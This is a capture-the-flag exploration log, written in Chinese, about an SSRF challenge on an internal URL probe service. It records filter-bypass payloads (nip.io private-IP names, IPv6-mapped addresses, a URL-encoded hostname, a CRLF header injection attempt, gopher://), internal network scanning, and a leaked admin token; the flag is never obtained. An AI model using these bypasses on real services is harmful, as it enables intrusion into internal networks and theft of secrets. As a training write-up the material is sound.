# a-16 · 探索记录（进行中）

对应题解：[`a-16.md`](./a-16.md)。

> 本文记录截至目前尝试。**flag 尚未取得**。

## 目标与起点

题面：「内网资产探测服务，运维可通过输入目标 URL 做连通性检测，并查看目标响应。Flag 在某个内网服务中。攻击者发现了内网接口 `http://internal-api:5000/debug/config`。」

启动后 `Werkzeug 3.1.7` + `Python 3.9`，登录页直接给出 `admin/Password123`，登录后是一个 URL 探测表单：

```
GET/POST /probe
  target_url=<URL>
  timeout=3|5|10|30
  follow_redirect=on
```

响应里会回显：状态码、内容长度、Content-Type、响应体预览（HTML 转义）。

## 第一阶段：过滤器边界

普通公网地址能探测（`http://web/` 返回 200）。内网目标被多道规则拦：

| 目标 | 结果 | 判据 |
| --- | --- | --- |
| `http://10.0.167.248:5000/…` | `禁止访问内网地址` | 私有网段字面量 |
| `http://172.19.0.2:5000/…` | `禁止访问内网地址` | 同上 |
| `http://127.0.0.1:5000/…` | `访问被阻止` | loopback 字面量 |
| `http://localhost:5000/…` | `访问被阻止` | 主机名黑名单 |
| `http://internal-api:5000/…` | `访问被阻止` | 主机名黑名单（含 `internal`） |
| `http://0x7f000001:5000/…` | `连接错误` | 不做十六进制解析 |
| `http://2130706433:5000/…` | `连接错误` | 不做十进制解析 |
| `http://127.1:5000/…` | `连接错误` | 不做短格式解析 |
| `http://[::1]:5000/…` | `连接错误` | — |
| `http://0.0.0.0:5000/…` | `访问被阻止` | — |
| `file:///etc/passwd` | `不支持的协议：file` | 只允许 http/https |

## 第二阶段：绕过 IP 检查（成功）

两类写法有效：

1. **DNS 名字指向私网 IP**：`http://172.18.0.2.nip.io:5000/`。过滤器只看「字面量是否像内网地址」，`nip.io` 解析后是私网，规则不覆盖。

> 注意：`internal-api` 所在的 docker 子网**每次实例重启都会变**。第一次是 `172.18.0.2`，重启后变成 `172.19.0.2`。所以扫段要按 `172.17~172.21` 逐个试，不要记死一个地址。
2. **IPv6-mapped 形式**：`http://[::ffff:172.19.0.3]:5000/` 也能过 IP 检查（返回超时而非「禁止访问内网」）。

用 (1) 扫网段定位到内网服务：

| 目标 | 结果 |
| --- | --- |
| `172.17.0.2/3:5000` | 超时 |
| **`172.18.0.2:5000`** | **探测成功** |
| `172.18.0.3:80` | 探测成功（就是探测服务自己的另一实例） |
| `172.19.*`、`172.20.*`、`172.21.*` | 超时 |

同时确认 `172.18.0.1:8080` 有一个 Go 服务（`/health` 返回 `{"cpu_percent":…,"resource_instance_id":"VM-…","running_range_count":2}`），这是平台的运行时探针，不是题目容器。

## 第三阶段：内网 API 的暴露面

`http://172.18.0.2.nip.io:5000/` 是「internal-api」。用探测器的响应体预览做目录枚举：

```
GET /health        → 200 {"status":"healthy"}
GET /status        → 200 {"service":"internal-api","status":"running","version":"1.0.0"}
GET /debug/config  → 200 {"api":{"admin_token":"internal_admin_token_2024",
                                 "internal_url":"http://internal-api:5000"},
                          "database":{"host":"localhost","name":"internal_db","port":3306}}
```

其余 80+ 个候选路径（`/admin`、`/flag`、`/api/*`、`/debug/env`、`/backup`、`/metrics`…）全部 404。

**已拿到的东西：`admin_token = internal_admin_token_2024`、`internal_url`、数据库名/端口。**

## 第四阶段：token 试用到所有已知位置（全部失败）

| 用法 | 结果 |
| --- | --- |
| 探测器请求内网 API 时带 `X-Admin-Token` / `Authorization: Bearer` 头 | 预览内容与不带一致（404/200 相同） |
| `?token=` / `?admin_token=` / `?api_key=` query | 同上 |
| `http://<token>@172.18.0.2.nip.io:5000/…`（userinfo） | 同上 |
| 对探测服务本身带 `X-Admin-Token` 访问 `/admin`、`/flag`、`/debug/config` | 全 404 |
| Cookie `admin_token=…` 访问探测服务 `/admin` | 404 |

**探测器的 `/probe` 只接受 URL，没有字段能设置转发头**（试过 `headers={...}`、`header=…`、`cookie=…`、`auth=…`），所以「带管理员 token 访问受保护端点」这条路走不通。

## 第四阶段补充：token 的传递方式（第二轮）

修好 cookie 解析后重跑（见下面的「踩坑」），确认内网 API 仍然只有三个端点：

| 尝试 | 结果 |
| --- | --- |
| `/debug/config?admin_token=…` | 响应与不带 token 完全一致 |
| 请求 `/probe` 时带 `X-Admin-Token` / `Authorization: Bearer`（期望探测器转发头） | 响应与不带一致 |
| `/debug/config?full=1` / `?admin=1` / `?debug=1` / `?raw=1` / 尾斜杠 | 全部与基线一致或 404 |
| 给 `/probe` 传 `method=POST` / `data=` / `body=` | 忽略，仍以 GET 取目标 |
| URL 里注入 `%0d%0aX-Admin-Token: …` | 被当作路径的一部分，目标返回 404 |
| `gopher://172.19.0.2:3306/_x` | `不支持的协议` |
| `http://172.19.0.2.nip.io:3306` / `:6379` / `:8000` | 全部 `连接错误`（端口不通） |

用 `small_clean.txt`（约 5 000 条，去重后 4 970 条）对 `172.19.0.2:5000` 做全量枚举，**非 404 的仍然只有 `/health`、`/status`、`/debug/config`**。

## 踩坑：一轮无效的 fuzz

第一版 fuzz 用 cookie jar 时把 `#HttpOnly_` 开头的行整体跳过了，导致请求没有会话、全部 302 到 `/login`，解析不到「状态码」，结果输出为空。**空结果不代表没有端点，先验证「基线请求是否真的成功」。**

## 第五阶段：其它可能性

| 方向 | 结果 |
| --- | --- |
| 内网其它端口（5001/8000/8080/8443/9000/9090/3000/3306/6379，在 172.18.0.2 上） | 全部 `连接错误` |
| 内网其它主机 172.18/172.19.0.4~.12（80/3000/5000/8080） | 全部超时 |
| 全端口扫描 1–10000（探测服务自身） | 只有 80 |
| 探测服务自身路由枚举（`/admin`、`/probe`、`/login`、`/logout`、`/static`…） | 只有 `login`、`logout`、`probe`、`/` |
| `/api/*` 在探测服务上 | 全 404 |
| 用 `web` 的开放重定向跳到内网 | `web/logout?next=` 只跳自己的 `/`，不带外站 |

## 目前的判断

1. SSRF 已经能打内网，`admin_token` 也已泄露，但**找不到消费这个 token 的端点**。
2. 内网 API 只暴露 `/health`、`/status`、`/debug/config` 三个端点，枚举 80+ 路径无新发现。
3. token 的使用方式可能是「另一个尚未发现的入口」：例如探测服务本身有一个需要管理员身份的调试端点，或者内网还有第二台机器。

## 第六阶段：主机名与 Host 变体

用 40 个候选主机名 × 6 个端口（5000/80/8080/3000/8000/9000）通过 SSRF 探测：

```
web:80         OK（就是探测服务自己）
web:5000/8080/3000/8000/9000  解析成功但端口拒绝
其余 39 个名字（flag / metadata / admin-api / vault / db / redis …）全部解析失败
```

`http://internal%2dapi:5000/...` 能解析（URL 编码的连字符绕过了主机名黑名单），但 `/debug/config` 的响应与用 `nip.io` 时**逐字节相同**；加 `X-Forwarded-Host: internal-api` 也无变化。

再确认 `Cookie: admin_token=<token>; token=<token>` 与 `X-Admin-Token` 一起发送时，4 935 条路径枚举**仍然只有 3 个端点**（说明探测服务不会把我们的头转发给目标，或 internal-api 根本不读这些头）。

## 结论（截至记录时）

- SSRF 已完全打通，能读任意 HTTP 端点、能绕 IP 黑名单。
- 拿到 `admin_token`，但**探测器的 `/probe` 只接受 URL，无法设置请求头**，因此「带 token 访问受保护端点」这条路被协议能力限制死。
- 内网 API 5 000 条路径枚举后只有 3 个只读端点，`3306/6379/8000` 均不可达。
- 剩余唯一未排除的可能是「内网还有第二台机器/第二个主机名」或「某个只接受特定 Host/Header 的端点」，但当前 SSRF 原语无法表达。

**flag 未取得。**
